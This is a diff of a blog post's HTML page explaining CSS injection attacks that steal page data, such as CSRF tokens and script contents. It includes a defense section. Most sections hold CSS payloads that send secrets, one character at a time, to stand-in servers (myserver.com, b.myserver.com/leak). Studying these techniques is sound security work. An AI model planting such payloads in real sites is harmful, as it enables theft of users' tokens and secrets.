@@ -28,12 +28,12 @@
 
 
 
-    <meta name="description" content="In Part 1, we learned the basic principle of stealing data with CSS and successfully stole the CSRF token as a practical example using HackMD. This article will delve into some details of CSS injecti">
+    <meta name="description" content="In Part 1, we learned the basic principle of stealing data with CSS and successfully stole the CSRF token as a practical example using HackMD. This article will delve into some details of CSS inject">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Stealing Data with CSS - CSS Injection (Part 2)">
 <meta property="og:url" content="https://blog.huli.tw/2022/09/29/en/css-injection-2/index.html">
 <meta property="og:site_name" content="Huli&#39;s blog">
-<meta property="og:description" content="In Part 1, we learned the basic principle of stealing data with CSS and successfully stole the CSRF token as a practical example using HackMD. This article will delve into some details of CSS injecti">
+<meta property="og:description" content="In Part 1, we learned the basic principle of stealing data with CSS and successfully stole the CSRF token as a practical example using HackMD. This article will delve into some details of CSS inject">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://blog.huli.tw/img/css-injection-2/cover-en.png">
 <meta property="article:published_time" content="2022-09-29T12:41:10.000Z">
@@ -258,6 +258,7 @@
     <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
         <img src="/img/css-injection-2/cover.png" style="display:none" loading="lazy">
+
 <p>In <a href="/2022/09/29/en/css-injection-1">Part 1</a>, we learned the basic principle of stealing data with CSS and successfully stole the CSRF token as a practical example using HackMD. This article will delve into some details of CSS injection and address the following issues:</p>
 <ol>
 <li>Since HackMD can load new styles without refreshing the page, how can we steal the second character and beyond on other websites?</li>
@@ -266,12 +267,13 @@
 <li>What are the defense mechanisms against this attack?</li>
 </ol>
 <span id="more"></span>
-<h2><span id="stealing-all-characters">Stealing All Characters</span></h2>
-<p>As we mentioned in Part 1, the data we want to steal may change after refreshing the page (such as the CSRF token), so we must load new styles without refreshing the page.</p>
+
+<h2><span id="stealing-all-characters">Stealing All Characters</span></h2><p>As we mentioned in Part 1, the data we want to steal may change after refreshing the page (such as the CSRF token), so we must load new styles without refreshing the page.</p>
 <p>The answer to this problem is given in <a target="_blank" rel="noopener" href="https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf">CSS Injection Attacks</a>: <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/@import">@import</a>.</p>
 <p>In CSS, you can use <code>@import</code> to import other styles from external sources, just like <code>import</code> in JavaScript.</p>
 <p>We can use this feature to create a loop that imports styles, as shown in the following code:</p>
 <pre class="line-numbers language-css" data-language="css"><code class="language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/start?len=8<span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>Then, the server returns the following style:</p>
 <pre class="line-numbers language-css" data-language="css"><code class="language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=1<span class="token punctuation">)</span></span>
 @import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=2<span class="token punctuation">)</span></span>
@@ -281,6 +283,7 @@
 @import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=6<span class="token punctuation">)</span></span>
 @import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=7<span class="token punctuation">)</span></span>
 @import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=8<span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>The key point is that although 8 are imported at once, “the server will hang for the next 7 requests and not respond”, and only the first URL <code>https://myserver.com/payload?len=1</code> will return a response, which is the payload for stealing data mentioned earlier:</p>
 <pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input[name="secret"][value^="a"]</span> <span class="token punctuation">&#123;</span>
   <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=a<span class="token punctuation">)</span></span>
@@ -299,6 +302,7 @@
 input[name="secret"][value^="z"]</span> <span class="token punctuation">&#123;</span>
   <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=z<span class="token punctuation">)</span></span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>When the browser receives the response, it will first load the CSS above, and after loading, elements that meet the conditions will send requests to the backend. Assuming the first character is d, the server will then return the response of <code>https://myserver.com/payload?len=2</code>, which is:</p>
 <pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input[name="secret"][value^="da"]</span> <span class="token punctuation">&#123;</span>
   <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=da<span class="token punctuation">)</span></span>
@@ -317,6 +321,7 @@ input[name="secret"][value^="z"]</span> <span class="token punctuation">&#123;</
 input[name="secret"][value^="dz"]</span> <span class="token punctuation">&#123;</span>
   <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=dz<span class="token punctuation">)</span></span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>This process can be repeated to send all characters to the server, relying on the feature that <code>import</code> will load resources that have already been downloaded and then wait for those that have not yet been downloaded.</p>
 <p>One thing to note here is that you will notice that the domain we load the style from is <code>myserver.com</code>, while the domain of the background image is <code>b.myserver.com</code>. This is because browsers usually have a limit on the number of requests that can be loaded from a single domain at the same time. Therefore, if you use only <code>myserver.com</code>, you will find that the request for the background image cannot be sent out and is blocked by CSS import.</p>
 <p>Therefore, two domains need to be set to avoid this situation.</p>
@@ -329,10 +334,10 @@ input[name="secret"][value^="dz"]</span> <span class="token punctuation">&#123;<
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=6<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=7<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=8<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>The above code works fine in Chrome, so we can change it to the above code to support both browsers.</p>
 <p>To summarize, using the <code>@import</code> CSS feature allows us to “dynamically load new styles without reloading the page” and thus steal every character from behind.</p>
-<h2><span id="stealing-one-character-at-a-time-is-too-slow-isnt-it">Stealing one character at a time is too slow, isn’t it?</span></h2>
-<p>If we want to execute this type of attack in the real world, we may need to improve efficiency. For example, in HackMD, the CSRF token has a total of 36 characters, so we need to send 36 requests, which is too many.</p>
+<h2><span id="stealing-one-character-at-a-time-is-too-slow-isnt-it">Stealing one character at a time is too slow, isn’t it?</span></h2><p>If we want to execute this type of attack in the real world, we may need to improve efficiency. For example, in HackMD, the CSRF token has a total of 36 characters, so we need to send 36 requests, which is too many.</p>
 <p>In fact, we can steal two characters at a time because, as mentioned in the previous section, there are suffix selectors in addition to prefix selectors. Therefore, we can do this:</p>
 <pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input[name="secret"][value^="a"]</span> <span class="token punctuation">&#123;</span>
   <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=a<span class="token punctuation">)</span></span>
@@ -350,15 +355,14 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
 <span class="token selector">input[name="secret"][value$="b"]</span> <span class="token punctuation">&#123;</span>
   <span class="token property">border-background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver2.com/suffix?q=b<span class="token punctuation">)</span></span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>In addition to stealing the beginning, we also steal the end, which immediately doubles the efficiency. It is important to note that the CSS for the beginning and end uses different properties, <code>background</code> and <code>border-background</code>, respectively. If we use the same property, the content will be overwritten by others, and only one request will be sent in the end.</p>
-<p>If there are not many characters that may appear in the content, such as 16, we can directly steal two beginnings and two ends at a time, and the total number of CSS rules is <code>16*16*2</code> = 512, which should still be within an acceptable range and can speed up the process by another two times.</p>
-<p>In addition, we can also improve towards the server side, such as using HTTP/2 or even HTTP/3, which have the opportunity to speed up the loading speed of requests and improve efficiency.</p>
-<h2><span id="stealing-other-things">Stealing other things</span></h2>
-<p>Besides stealing attributes, is there any way to steal other things? For example, other text on the page? Or even the code in the script?</p>
+<p>If there are not many characters that may appear in the content, such as 16, we can directly steal two beginnings and two ends at a time, and the total number of CSS rules is <code>16*16*2</code> &#x3D; 512, which should still be within an acceptable range and can speed up the process by another two times.</p>
+<p>In addition, we can also improve towards the server side, such as using HTTP&#x2F;2 or even HTTP&#x2F;3, which have the opportunity to speed up the loading speed of requests and improve efficiency.</p>
+<h2><span id="stealing-other-things">Stealing other things</span></h2><p>Besides stealing attributes, is there any way to steal other things? For example, other text on the page? Or even the code in the script?</p>
 <p>According to the principle we mentioned in the previous section, it is impossible to do so. The reason we can steal attributes is that the “attribute selector” allows us to select specific elements, and in CSS, there is no selector that can select “text content”.</p>
 <p>Therefore, we need to have a deeper understanding of CSS and styles on the webpage to achieve this seemingly impossible task.</p>
-<h3><span id="unicode-range">unicode-range</span></h3>
-<p>In CSS, there is a property called “unicode-range”, which can load different fonts for different characters. For example, the following example is taken from <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face/unicode-range">MDN</a>:</p>
+<h3><span id="unicode-range">unicode-range</span></h3><p>In CSS, there is a property called “unicode-range”, which can load different fonts for different characters. For example, the following example is taken from <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face/unicode-range">MDN</a>:</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
@@ -378,6 +382,7 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>The unicode of <code>&amp;</code> is <code>U+0026</code>, so only the character <code>&amp;</code> will be displayed in a different font, and the others will use the same font.</p>
 <p>Front-end engineers may have used this trick, for example, to use different fonts to display English and Chinese. This trick can also be used to steal text on the page, like this:</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
@@ -428,6 +433,7 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
     Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>ca31a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>If you check the network tab, you will see a total of 4 requests sent:</p>
 <p><img src="/img/css-injection-2/p1.png" alt="network"></p>
 <p>With this trick, we can know that there are 13ac four characters on the page.</p>
@@ -437,8 +443,7 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
 <li>We don’t know the repeated characters.</li>
 </ol>
 <p>However, thinking about how to steal characters from the perspective of “loading fonts” has really brought a new way of thinking to many people and has developed various other methods.</p>
-<h3><span id="font-height-difference-first-line-scrollbar">Font height difference + first-line + scrollbar</span></h3>
-<p>This trick mainly solves the problem encountered in the previous trick: “cannot know the order of the characters”. This trick combines many details, and there are many steps, so you need to listen carefully.</p>
+<h3><span id="font-height-difference-first-line-scrollbar">Font height difference + first-line + scrollbar</span></h3><p>This trick mainly solves the problem encountered in the previous trick: “cannot know the order of the characters”. This trick combines many details, and there are many steps, so you need to listen carefully.</p>
 <p>First, we can actually not load external fonts and leak out characters using built-in fonts. How can we do this? We need to find two sets of built-in fonts with different heights.</p>
 <p>For example, there is a font called “Comic Sans MS”, which is higher than another font called “Courier New”.</p>
 <p>For example, assuming that the default font height is 30px and Comic Sans MS is 45px. Now we set the height of the text block to 40px and load the font, like this:</p>
@@ -468,6 +473,7 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>ABC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>We will see the difference on the screen:</p>
 <p><img src="/img/css-injection-2/p2.png" alt="height"></p>
 <p>It is obvious that A is higher than the height of other characters, and according to our CSS settings, if the content height exceeds the container height, a scrollbar will appear. Although it is not visible in the screenshot above, the ABC below has a scrollbar, while the DBC above does not.</p>
@@ -479,6 +485,7 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
 <span class="token selector">div::-webkit-scrollbar:vertical</span> <span class="token punctuation">&#123;</span>
     <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>In other words, if the scrollbar appears, our server will receive a request. If the scrollbar does not appear, no request will be received.</p>
 <p>Furthermore, when I apply the “fa” font to the div, if there is an “A” on the screen, the scrollbar will appear, and the server will receive a request. If there is no “A” on the screen, nothing will happen.</p>
 <p>Therefore, if I keep loading different fonts repeatedly, I can know what characters are on the screen on the server, which is the same as what we can do with <code>unicode-range</code> we learned earlier.</p>
@@ -513,6 +520,7 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
     Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>CBAD<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>You will only see the character “C” on the screen because we first set the size of all characters to 0 using <code>font-size: 0px</code>, and then use <code>div::first-line</code> to adjust the font-size of the first line to 30px. In other words, only the characters on the first line can be seen, and the current div width is only 20px, so only the first character will appear.</p>
 <p>Next, we can use the trick we just learned to load different fonts and see what happens. When I load the “fa” font, because there is no “A” on the screen, nothing will change. But when I load the “fc” font, “C” appears on the screen, so it will be displayed using Comic Sans MS, the height will increase, the scrollbar will appear, and we can use it to send a request, like this:</p>
 <pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>
@@ -538,6 +546,7 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
 <span class="token selector">div::-webkit-scrollbar:vertical</span> <span class="token punctuation">&#123;</span>
   <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">var</span><span class="token punctuation">(</span>--leak<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>So how do we keep using new font-families? We can use CSS animation to continuously load different font-families and specify different <code>--leak</code> variables.</p>
 <p>In this way, we can know what the first character on the screen is.</p>
 <p>After knowing the first character, we can make the width of the div longer, for example, to 40px, which can accommodate two characters. Therefore, the first line will be the first two characters, and then we can use the same method to load different font-families to leak out the second character, as follows:</p>
@@ -556,8 +565,7 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
 <p>From the above process, it can be seen that the server will receive three requests in sequence, A, C, B, representing the order of the characters on the screen. Changing the width and font-family continuously can be achieved using CSS animation.</p>
 <p>If you want to see the complete demo, you can check out this webpage (source: <a target="_blank" rel="noopener" href="https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/">What can we do with single CSS injection?</a>): <a target="_blank" rel="noopener" href="https://demo.vwzq.net/css2.html">https://demo.vwzq.net/css2.html</a></p>
 <p>Although this solution solves the problem of “not knowing the order of characters”, it still cannot solve the problem of duplicate characters, because no request will be sent for duplicate characters.</p>
-<h3><span id="ultimate-move-ligature-scrollbar">Ultimate move: ligature + scrollbar</span></h3>
-<p>In short, this trick can solve all the above problems, achieve the goal of “knowing the order of characters and knowing duplicate characters”, and steal the complete text.</p>
+<h3><span id="ultimate-move-ligature-scrollbar">Ultimate move: ligature + scrollbar</span></h3><p>In short, this trick can solve all the above problems, achieve the goal of “knowing the order of characters and knowing duplicate characters”, and steal the complete text.</p>
 <p>Before understanding how to steal, we need to know a proprietary term called ligature. In some fonts, some specific combinations will be rendered as a connected shape, as shown in the figure below (source: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Ligature_(writing)">wikipedia</a>):</p>
 <p><img src="/img/css-injection-2/p3.png" alt="ligature"></p>
 <p>So what’s the benefit of this to us?</p>
@@ -578,6 +586,7 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
 <pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">head, script</span> <span class="token punctuation">&#123;</span>
   <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>Just add this CSS, and the contents of the script will be displayed on the screen. Therefore, we can also use the same technique to steal the contents of the script!</p>
 <p>In practice, you can use SVG with other tools to quickly generate fonts on the server side. If you want to see the details and related code, you can refer to this article: <a target="_blank" rel="noopener" href="https://research.securitum.com/stealing-data-in-great-style-how-to-use-css-to-attack-web-application/">Stealing Data in Great style – How to Use CSS to Attack Web Application.</a></p>
 <p>Here, I will simply make a demo that is simplified to the extreme to prove that this is feasible. To simplify, someone has made a Safari version of the demo, because Safari supports SVG fonts, so there is no need to generate fonts from the server. The original article is here: <a target="_blank" rel="noopener" href="https://github.com/masatokinugawa/css-exfiltration-svg-font/">Data Exfiltration via CSS + SVG Font - PoC (Safari only)</a></p>
@@ -617,6 +626,7 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
   </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>I put two pieces of JS in the script, the contents of which are <code>var secret = &quot;abc123&quot;</code> and <code>var secret2 = &quot;cba321&quot;</code>, and then use CSS to load the font I prepared. As long as there is a ligature of <code>&quot;a</code>, the width will become ultra-wide.</p>
 <p>Next, if the scrollbar appears, I set the background to blue, which is more conspicuous. The final result is as follows:</p>
 <p><img src="/img/css-injection-2/p4.png" alt="scroll"></p>
@@ -624,12 +634,10 @@ input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</
 <p>Below, because there is no <code>&quot;a</code>, the scrollbar does not appear (where there is an <code>a</code> will be missing, which should be related to me not defining other glyphs, but it does not affect the result).</p>
 <p>Just change the background of the scrollbar to a URL, and you can know the leaked result from the server side.</p>
 <p>If you want to see the actual demo and server-side code, you can refer to the two articles attached above.</p>
-<h2><span id="defense">Defense</span></h2>
-<p>Finally, let’s talk about defense. The simplest and most straightforward way is to simply seal up the style and not allow its use. Basically, there will be no CSS injection problems (unless there are vulnerabilities in the implementation).</p>
+<h2><span id="defense">Defense</span></h2><p>Finally, let’s talk about defense. The simplest and most straightforward way is to simply seal up the style and not allow its use. Basically, there will be no CSS injection problems (unless there are vulnerabilities in the implementation).</p>
 <p>If you really want to open up the style, you can also use CSP to block the loading of some resources, such as not needing to fully open <code>font-src</code>, and <code>style-src</code> can also set an allow list to block the <code>@import</code> syntax.</p>
 <p>Next, you can also consider “what will happen if things on the page are taken away”, such as if the CSRF token is taken away, the worst case is CSRF, so you can implement more protection to block CSRF, even if the attacker obtains the CSRF token, they cannot CSRF (such as checking the origin header more).</p>
-<h2><span id="summary">Summary</span></h2>
-<p>CSS is really vast and profound. I really admire these predecessors who can play with CSS in so many ways and develop so many eye-opening attack techniques. When I was studying it, I could understand using attribute selectors to leak, and I could understand using <code>unicode-range</code>, but the one that uses text height plus CSS animation to change, I spent a lot of time to figure out what it was doing. Although the concept of ligatures is easy to understand, there are still many problems when it comes to implementation.</p>
+<h2><span id="summary">Summary</span></h2><p>CSS is really vast and profound. I really admire these predecessors who can play with CSS in so many ways and develop so many eye-opening attack techniques. When I was studying it, I could understand using attribute selectors to leak, and I could understand using <code>unicode-range</code>, but the one that uses text height plus CSS animation to change, I spent a lot of time to figure out what it was doing. Although the concept of ligatures is easy to understand, there are still many problems when it comes to implementation.</p>
 <p>Finally, these two articles mainly introduce the CSS injection attack method. Therefore, there is not much actual code, and these attack methods are all referenced from previous articles. The list will be attached below. If you are interested, you can read the original text, which will be more detailed. If you want to delve into any attack, you can also leave a message to communicate with me.</p>
 <p>References:</p>
 <ol>
